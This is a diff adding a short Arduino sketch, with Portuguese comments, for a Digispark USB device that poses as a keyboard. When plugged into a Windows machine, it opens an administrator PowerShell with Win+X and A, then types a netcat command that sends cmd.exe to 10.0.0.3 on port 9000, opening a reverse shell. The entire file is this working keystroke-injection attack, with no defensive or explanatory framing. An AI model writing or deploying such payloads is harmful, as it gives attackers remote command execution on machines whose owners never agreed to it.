@@ -1,0 +1,29 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+
+}
+
+void loop() {
+  // Cancela o efeito de todas as teclas já pressionadas para evitar possíveis conflitos
+  DigiKeyboard.sendKeyStroke (0);
+  
+  // Pausa de 1.5s
+  DigiKeyboard.delay (1500);
+
+  // Comandos no Power Shell
+  DigiKeyboard.sendKeyStroke (KEY_X, MOD_GUI_LEFT);
+  DigiKeyboard.delay (1500);
+  DigiKeyboard.sendKeyStroke (KEY_A);
+  DigiKeyboard.delay (1500);
+
+  // Executando o Netcat
+  // Só funciona com as variáveis de ambiente devidamente configuradas para o nc
+  DigiKeyboard.println ("nc");
+  DigiKeyboard.delay (1500);
+  DigiKeyboard.println ("10.0.0.3 9000 -e cmd.exe");
+  
+  for (;;){  
+    // Útil para evitar o loop do código acima
+  }   
+}
